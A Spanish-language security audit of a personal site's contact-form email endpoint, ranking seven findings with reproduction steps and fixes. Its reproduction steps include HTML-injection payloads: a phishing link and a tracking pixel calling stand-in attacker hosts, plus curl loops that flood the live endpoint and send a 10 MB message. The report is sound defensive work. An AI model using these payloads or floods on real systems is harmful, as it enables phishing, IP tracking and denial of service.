# Informe de Seguridad — emersoftware-site

Fecha: 2026-04-27
Alcance: revisión estática del repo en `main` (commit `44071dc`).

Cada hallazgo está numerado para que puedas marcar el avance al ir probándolos uno a uno. El orden es por severidad: arreglar de arriba hacia abajo.

---

## S1 — 🔴 CRÍTICO: Inyección HTML en el cuerpo del email

**Archivo:** [src/pages/email.js:151](src/pages/email.js)

```js
html: `<p>Name: ${firstname} ${lastname}</p><p>Email: ${email}</p><p>Message: ${message}</p>`,
```

### Problema
Los cuatro campos (`firstname`, `lastname`, `email`, `message`) vienen del usuario y se interpolan directamente en una plantilla HTML que termina en tu bandeja de Gmail. Un atacante puede inyectar:

- Enlaces de phishing con texto ofuscado: `<a href="https://evil.tld">Click aquí para ver tu CV</a>`.
- Tracking pixels que filtran tu IP de Gmail al abrir: `<img src="https://attacker.tld/p?u=emerson">`.
- HTML que sobreescribe la plantilla y se hace pasar por un email "oficial" de Resend o un cliente.
- En clientes laxos (no Gmail), incluso CSS / `<style>` malicioso.

### Cómo reproducirlo
Manda el form con `message`:
```html
<a href="https://www.google.com">Soy un link inocente</a><img src="https://webhook.site/UUID/pixel.png">
```
En el email recibido vas a ver un link clickable y, al abrirlo en Gmail, una request al webhook (Gmail proxiea imágenes, así que verás la IP de Google, pero el comportamiento prueba la inyección).

### Mitigación
Dos opciones, en orden de preferencia:

**Opción A (recomendada): usar `text` en vez de `html`.**
```js
const msg = {
  from: 'noreply@tu-dominio-verificado.cl',
  to: ['e.benjaminsalazarrubilar@gmail.com'],
  reply_to: email,
  subject: 'Mensaje desde el sitio',
  text: `Nombre: ${firstname} ${lastname}\nEmail: ${email}\n\n${message}`,
};
```
El campo `text` no se renderiza como HTML, así que no hay inyección posible.

**Opción B: escapar entidades antes de interpolar.**
```js
const escapeHtml = (s) =>
  String(s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  }[c]));

const html = `<p>Name: ${escapeHtml(firstname)} ${escapeHtml(lastname)}</p>
<p>Email: ${escapeHtml(email)}</p>
<p>Message: ${escapeHtml(message).replace(/\n/g, '<br>')}</p>`;
```

### Cómo verificar la fix
Tras aplicarla, repite el test con el `<a>` y el `<img>`. El email debería mostrar las etiquetas como **texto plano** (`&lt;a href=...`) en vez de un link clickeable.

---

## S2 — 🔴 ALTO: Sin rate limiting en `/email`

**Archivo:** [src/pages/email.js](src/pages/email.js)

### Problema
Turnstile reduce el spam de bots tontos pero **no es rate limiting**:
- Un atacante con un solver (o resolviendo manualmente) puede pedir N tokens y mandar N emails.
- Cada request consume cuota de Resend (3000/mes en plan free) y una invocación de Vercel (función serverless).
- En el peor caso: agotan tu cuota de Resend → te quedas sin contacto. O te llenan la bandeja con miles de emails en minutos.

### Cómo reproducirlo
Con `curl`, sin Turnstile:
```bash
for i in {1..50}; do
  curl -X POST https://emersoftware.cl/email \
    -F "firstname=test$i" -F "lastname=test" \
    -F "email=test@test.com" -F "message=spam $i" \
    -F "cf-turnstile-response=fake" &
done
```
Aunque el server rechace por Turnstile inválido, igual estás gastando invocación Vercel en validar. Sin Turnstile-bypass igual hay flujo de error que cuesta dinero.

Con Turnstile válido (resuelto manualmente o con un solver), no hay ningún bloqueo.

### Mitigación
Implementa un rate limit por IP. Opciones de menor a mayor esfuerzo:

**1. Vercel KV + token bucket (recomendado)**
```js
import { kv } from '@vercel/kv';

const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
const key = `ratelimit:email:${ip}`;
const count = await kv.incr(key);
if (count === 1) await kv.expire(key, 3600); // ventana 1h
if (count > 5) {
  return new Response(JSON.stringify({ message: 'Too many requests' }), {
    status: 429,
    headers: commonHeaders,
  });
}
```

**2. Upstash Redis (mismo patrón, fuera de Vercel)**

**3. Limitar fail-open con un secreto compartido entre el form (en cookie httpOnly firmada) y el endpoint.** Más débil pero útil como capa adicional.

### Cómo verificar la fix
Repetir el `for` loop de arriba — al sexto request deberías ver `429`.

---

## S3 — 🔴 ALTO: Filtración de información en respuestas de error

**Archivo:** [src/pages/email.js:177-200](src/pages/email.js), [src/pages/email.js:238-249](src/pages/email.js)

```js
return new Response(
  JSON.stringify({
    message: 'Error sending email',
    error: data_res?.error || 'Unknown error',
    status: res.status,
    errorDetails: { code: data_res?.statusCode, message: data_res?.message },
  }),
  { status: 500, headers: commonHeaders },
);
```

```js
return new Response(
  JSON.stringify({
    message: 'Server error',
    error: error.message,
    name: error.name,
    code: error.code || 'UNKNOWN_ERROR',
  }),
  { status: 500, headers: commonHeaders },
);
```

### Problema
Estás devolviendo al cliente:
- Mensajes y códigos internos de Resend (revela qué API y versión usas).
- `error.name` y `error.code` de Node (ej. `ENOTFOUND`, `ECONNREFUSED`) → revela arquitectura.
- En el peor caso, si `error.message` incluyera parte de la API key (ej. en logs poco cuidadosos), se filtraría.

Es info útil para reconocimiento (recon) en pre-explotación.

### Cómo reproducirlo
- **Forzar 500:** elimina la env var `RESEND_API_KEY` localmente y manda una request válida. Verás `{ "message": "Missing Resend API Key" }` (este caso es info de configuración interna, debería ser genérico).
- **Forzar el catch general:** envía `Content-Type: application/json` con body inválido en vez de FormData. La excepción incluirá un nombre de error de Node.

### Mitigación
Loguea detallado server-side, devuelve genérico al cliente:
```js
} catch (error) {
  console.error('Email endpoint error:', error);
  return new Response(JSON.stringify({ message: 'Internal error' }), {
    status: 500,
    headers: commonHeaders,
  });
}
```
Y en los `else` de error de Resend:
```js
console.error('Resend error:', { status: res.status, data: data_res });
return new Response(JSON.stringify({ message: 'Could not send email' }), {
  status: 502, headers: commonHeaders,
});
```

### Cómo verificar la fix
Las respuestas de error solo deben contener `{ message: "..." }` sin nombres de error, códigos, ni stack. Los logs del server (Vercel logs) sí deben tener todo el detalle.

---

## S4 — 🟡 MEDIO: Sin límite de longitud en inputs

**Archivos:** [src/pages/email.js:21-24](src/pages/email.js), [src/components/ContactForm.astro:60-67](src/components/ContactForm.astro)

### Problema
El `<textarea name="message">` no tiene `maxlength`, y el server no valida tamaño. Un atacante puede:
- Mandar 10 MB en `message` → consume bandwidth, tiempo de función Vercel, y rebota en Resend (límite ~10 MB).
- Combinado con la falta de rate limit (S2), permite DoS de bajo costo.

### Cómo reproducirlo
```bash
MSG=$(python3 -c "print('a'*10000000)")
curl -X POST https://emersoftware.cl/email \
  -F "firstname=test" -F "lastname=test" -F "email=t@t.cl" \
  -F "message=$MSG" -F "cf-turnstile-response=..."
```

### Mitigación
**Cliente:**
```html
<input type="text" name="firstname" maxlength="80" required />
<input type="text" name="lastname" maxlength="80" required />
<input type="email" name="email" maxlength="254" required />
<textarea name="message" maxlength="2000" required></textarea>
```

**Server (defensa en profundidad):**
```js
const LIMITS = { firstname: 80, lastname: 80, email: 254, message: 2000 };
for (const [field, max] of Object.entries(LIMITS)) {
  const v = data.get(field);
  if (typeof v !== 'string' || v.length > max) {
    return new Response(JSON.stringify({ message: 'Invalid input' }), {
      status: 400, headers: commonHeaders,
    });
  }
}
```

### Cómo verificar la fix
Mandar un payload de >10k caracteres en `message`: debe responder 400 sin llegar a Resend.

---

## S5 — 🟡 MEDIO: `from` usa el sender de prueba de Resend

**Archivo:** [src/pages/email.js:148](src/pages/email.js)

```js
from: 'onboarding@resend.dev',
```

### Problema
- `onboarding@resend.dev` es para pruebas. Gmail/Outlook lo marcan como spam con frecuencia.
- Un atacante que controle otro dominio en Resend podría enviar emails con el mismo sender (compartido).
- Se ve poco profesional para clientes potenciales.

### Mitigación
1. Verifica `emersoftware.cl` en Resend (DNS: SPF, DKIM, opcionalmente DMARC).
2. Usa `from: 'noreply@emersoftware.cl'` o `from: 'contacto@emersoftware.cl'`.
3. Configura DMARC con `p=quarantine` mínimo.

### Cómo verificar la fix
- Manda un test desde el form a un Gmail propio.
- En Gmail → "Mostrar original" → revisa que SPF, DKIM y DMARC sean `PASS`.
- El email debe llegar a Inbox, no Spam.

---

## S6 — 🟡 MEDIO: Falta `reply_to`

**Archivo:** [src/pages/email.js:147-152](src/pages/email.js)

### Problema
El email del visitante está embebido en el cuerpo pero no como header `Reply-To`. Cuando le das "Responder" en Gmail, va a `onboarding@resend.dev` (o `noreply@…` después de S5), no al visitante. Pierdes leads y tienes que copiar el email a mano.

### Mitigación
```js
const msg = {
  from: 'noreply@emersoftware.cl',
  to: ['e.benjaminsalazarrubilar@gmail.com'],
  reply_to: email,           // ← agregar
  subject: `Mensaje de ${firstname} ${lastname}`,
  text: `${message}\n\n— ${firstname} ${lastname} <${email}>`,
};
```

### Cómo verificar la fix
Mandas un test con tu email A. Recibes en email B. Click en "Responder": el destinatario debe ser email A.

---

## S7 — 🟢 BAJO: Validación de email confía solo en HTML5

**Archivo:** [src/pages/email.js:23](src/pages/email.js)

### Problema
`type="email"` se salta con un `curl` o devtools. Server no valida formato.

### Mitigación
Validación simple server-side:
```js
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (typeof email !== 'string' || !EMAIL_RE.test(email) || email.length > 254) {
  return new Response(JSON.stringify({ message: 'Invalid email' }), {
    status: 400, headers: commonHeaders,
  });
}
```
(El RFC 5321 es más complejo pero esta regex cubre 99% de casos válidos sin falsos negativos relevantes.)

### Cómo verificar la fix
```bash
curl -X POST .../email -F email="no-es-email" ...
```
Debe responder 400.

---

## Checklist final

- [ ] S1 — Escapar HTML / usar `text` en email
- [ ] S2 — Implementar rate limiting
- [ ] S3 — Sanitizar respuestas de error
- [ ] S4 — Limitar longitud de inputs (cliente + server)
- [ ] S5 — Verificar dominio en Resend, cambiar `from`
- [ ] S6 — Agregar `reply_to`
- [ ] S7 — Validar formato de email server-side

## Referencias

- OWASP — HTML Injection: https://owasp.org/www-community/attacks/Code_Injection
- Resend — Domain verification: https://resend.com/docs/dashboard/domains/introduction
- Vercel KV: https://vercel.com/docs/storage/vercel-kv
- Cloudflare Turnstile (no es rate limit): https://developers.cloudflare.com/turnstile/
